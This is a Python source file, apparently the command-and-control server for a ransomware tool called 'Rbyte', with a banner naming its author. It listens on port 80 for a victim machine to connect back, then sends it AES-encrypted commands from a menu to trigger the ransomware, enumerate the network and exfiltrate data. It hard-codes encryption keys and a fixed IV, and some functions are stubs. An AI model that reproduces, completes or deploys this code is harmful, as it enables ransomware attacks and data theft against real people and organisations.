#Rbyte the user server
import socket
import os
from termcolor import colored
from Crypto.Cipher import AES
import sys
import os
import sys
import time

#Kind of Log File **

os.system("echo RapeByte Initiated:::::[$(date)] >> rbyte.log ")
keys = {
    'enc0': 'A3317AF79FEB1C1778E27AFE728BEF8B',
    'enc1': '4CB54FEC78114473387BD86400EDF85B',
    'enc2': '9C2B81E47254333AA1218FB1B7697CEB',
    'enc3': 'E814DD5D259E8237D02A19F9CB8D078B'
}

log = '''
     ____                         
    /    )   /                   
---/___ /---/__--------_/_----__-
  /    |   /   ) /   / /    /___)
_/_____|__(___/_(___/_(_ __(___ _
                   /             
               (_ /              
                    (For Linux)
            
https://github.com/SxNade   :|: SxNade@protonmail.com
                    
'''

usage = '''
                            #USAGE#
                python3 rbyte.py <listening-IP-address>

                Example:: python3 rbyte.py 192.168.1.100
'''
if len(sys.argv) != 2:
    print(log)
    print("\n")
    print(usage)
    sys.exit()

O = colored("0)", 'red')
A = colored("1)", 'red')
B = colored("2)", 'red')
C = colored("3)", 'red')
D = colored("3)", 'red')

commands = f'''
#Please Read the man.txt file for info on options#
{O} start [To start  Rbyte]
{A} run [trigger the ransomware will perform enum&exfil] ::
{B} enum [will enumerate the network] ::
{C} exfil [will start exfiltrating data] ::
{D} auto [will work in automatic mode] :: use with caution

'''

print(log)
print("[*] Loading First Encryption Key\n")
print(commands)


def delv_enum():
    os.system("")

def svr():
    global s
    global conn
    s = socket.socket()
    s.bind((sys.argv[1], 80))
    s.listen(1)
    print(colored("\n[+] Command Server is Active Now Awaiting For Victim to Connect\n", 'green'))
    conn , addr = s.accept()
    print(f"[*] {addr} Successfully Connected")
    print(colored("[+] Please Note This Reverse Connection IP for Furthur use", "red", attrs=['bold']))

def key_gen():
    print(colored("[+]Initializing Encryption Channel", 'green'))
    global enc_key
    enc_key = 'EBC3D4C51C46801A7267AAB59A63551B'

def start_encryption(key):
    global magic
    magic = AES.new(f'{enc_key}', AES.MODE_CFB, 'This is an IV456') #StackOverflow LOL!


def recv_send_data(metadata='error'):
    usr = metadata.encode()
    usr_send = magic.encrypt(usr)
    conn.send(usr_send)
    In_messg = conn.recv(8192)
    recv_data_enc = magic.decrypt(In_messg)
    global recv_data_dec
    recv_data_dec = recv_data_enc.decode()

def run():
    print(colored("[*] FiringUp Rapebyte Now..."))
    while True:
        usr = input(colored("\nRbyte~$ "))
        if usr == 'run':
            recv_send_data(usr)
        elif usr == 'enum':
            os.system("echo 'Enumeration Selected By $HOSTNAME:::::[$(date)]' >> rbyte.log ")
            print(colored("[+] Switching To Second Stage Encryption Key", 'red', attrs=['bold']))
            start_encryption(keys.get('enc0'))
            recv_send_data(usr)
            print("[+] Starting Server For Delivering Enumeration Payload:::Runtime set to 60sec")
        elif usr == 'exfil':
            recv_send_data(usr)
        elif usr == 'auto':
            recv_send_data(usr)
        elif len(usr) == 0:
            recv_send_data()
        else:
            recv_send_data()
        print(colored(recv_data_dec, 'green', attrs=['bold']))


def main():
    svr()
main()

while True:
    usr = input(colored("\nRbyte~$ "))
    if usr == 'start':
        key_gen()
        start_encryption(enc_key)
        run()

